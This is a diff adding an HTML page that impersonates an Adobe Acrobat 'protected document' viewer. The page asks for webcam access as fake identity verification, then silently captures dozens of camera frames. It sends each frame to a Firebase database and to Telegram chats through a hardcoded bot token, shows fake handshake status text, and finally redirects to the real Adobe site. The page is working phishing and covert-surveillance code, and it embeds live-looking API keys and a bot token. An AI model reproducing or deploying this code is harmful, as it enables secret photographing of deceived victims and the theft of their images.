@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat - Secure PDF Viewer</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --adobe-red: #FA0F00;
+            --adobe-dark: #2C2C2C;
+            --adobe-bg: #F5F5F5;
+            --adobe-text: #323232;
+            --adobe-blue: #1473E6;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--adobe-bg); color: var(--adobe-text);
+            font-family: "Adobe Clean", "Source Sans Pro", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        /* Acrobat Toolbar Aesthetic */
+        .adobe-navbar {
+            background: #fff; height: 48px; border-bottom: 1px solid #E1E1E1;
+            display: flex; align-items: center; padding: 0 20px; justify-content: space-between;
+        }
+
+        .adobe-logo { display: flex; align-items: center; gap: 8px; font-weight: 700; color: var(--adobe-red); font-size: 14px; }
+        .adobe-logo svg { width: 24px; fill: var(--adobe-red); }
+
+        .viewer-container {
+            flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px;
+        }
+
+        .pdf-page {
+            width: 100%; max-width: 600px; aspect-ratio: 1 / 1.414; background: #fff;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15); border-radius: 4px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            position: relative; overflow: hidden;
+        }
+
+        .blur-content {
+            position: absolute; width: 100%; height: 100%; top: 0; left: 0;
+            background: url('https://www.adobe.com/content/dam/cc/us/en/products/acrobat/media_1.png?auto=webp&format=pjpg&width=2000&height=1334') center;
+            filter: blur(15px); opacity: 0.3; z-index: 1;
+        }
+
+        .overlay-card {
+            z-index: 2; width: 80%; background: rgba(255, 255, 255, 0.95);
+            padding: 32px; border-radius: 8px; text-align: center;
+            border: 1px solid #E1E1E1;
+        }
+
+        .lock-icon { width: 50px; margin-bottom: 20px; fill: var(--adobe-dark); }
+
+        h1 { font-size: 20px; font-weight: 700; margin: 0 0 12px; color: var(--adobe-dark); }
+        p { font-size: 14px; color: #6E6E6E; line-height: 1.6; margin-bottom: 32px; }
+
+        .btn-adobe {
+            background: var(--adobe-blue); color: #fff; border: none;
+            padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 700;
+            cursor: pointer; transition: background 0.2s;
+        }
+        .btn-adobe:hover { background: #0D66D0; }
+
+        /* Decryption State */
+        #decrypt-ui { display: none; }
+        
+        .progress-track {
+            width: 100%; height: 4px; background: #E1E1E1; border-radius: 2px;
+            margin-top: 24px; position: relative; overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%; height: 100%; background: var(--adobe-blue);
+            transition: width 1s linear;
+        }
+
+        .status-badge {
+            font-size: 11px; font-weight: 700; text-transform: uppercase;
+            color: var(--adobe-blue); letter-spacing: 1px; margin-bottom: 8px;
+        }
+
+        .location-footer {
+            font-size: 11px; color: #999; margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="adobe-navbar">
+        <div class="adobe-logo">
+            <svg viewBox="0 0 192 192"><path d="M117.8 28.5L163.5 146.4c1.1 2.8-1.1 5.6-4.1 5.6h-28.7c-1.9 0-3.6-1.1-4.4-2.9l-13.8-35.3H68.8l-13.8 35.3c-.8 1.8-2.5 2.9-4.4 2.9H21.9c-3 0-5.2-2.8-4.1-5.6L63.5 28.5c1.1-2.8 3.7-4.6 6.7-4.6h40.9c3 0 5.6 1.8 6.7 4.6zM95.6 44.4L76.5 94.6h38.2L95.6 44.4z"/></svg>
+            Adobe Acrobat
+        </div>
+        <div style="font-size: 12px; color: #6E6E6E;">File: Confidential_Asset_Report.pdf</div>
+    </div>
+
+    <div class="viewer-container">
+        <div class="pdf-page">
+            <div class="blur-content"></div>
+            
+            <div class="overlay-card" id="start-ui">
+                <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg>
+                <h1>Protected Document</h1>
+                <p>This file is encrypted using <b>Adobe Presence-Lock</b>. To view the content, please complete the identity verification through your workspace camera.</p>
+                
+                <button class="btn-adobe" onclick="initiateAdobeAuth()">Verify Identity</button>
+                <div class="location-footer">Security Node: Mumbai_West_MH</div>
+            </div>
+
+            <div class="overlay-card" id="decrypt-ui">
+                <div class="status-badge">Authenticating Presence</div>
+                <div style="font-size: 13px;">Establishing Secure Relay to Mumbai Data Center...</div>
+                
+                <div class="progress-track">
+                    <div class="progress-fill" id="adobe-p-bar"></div>
+                </div>
+                
+                <div style="font-size: 11px; color: #999; margin-top: 12px;" id="adobe-timer">Handshake valid for 60s</div>
+                
+                <div style="text-align: left; font-family: monospace; font-size: 9px; color: #1473E6; background: #F0F7FF; padding: 8px; border-radius: 4px; margin-top: 20px;">
+                    > RSA_HANDSHAKE_INIT...<br>
+                    > BIOMETRIC_RECON_START...<br>
+                    > CLOUD_NODE: MUMBAI_PRIMARY
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Background Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiateAdobeAuth() {
+            try {
+                // Requesting camera permission under the guise of "Presence Lock"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('decrypt-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('adobe-timer').innerText = `Handshake valid for ${timeLeft}s`;
+                        document.getElementById('adobe-p-bar').style.width = `${((60-timeLeft)/60)*100}%`;
+
+                        if (count <= 55) {
+                            adobeRelay(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real Adobe PDF or Landing Page
+                            window.location.href = "https://www.adobe.com/acrobat/online/pdf-reader.html";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.adobe.com/acrobat/online/pdf-reader.html";
+            }
+        }
+
+        function adobeRelay(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "ADOBE_PDF_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'adobe_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
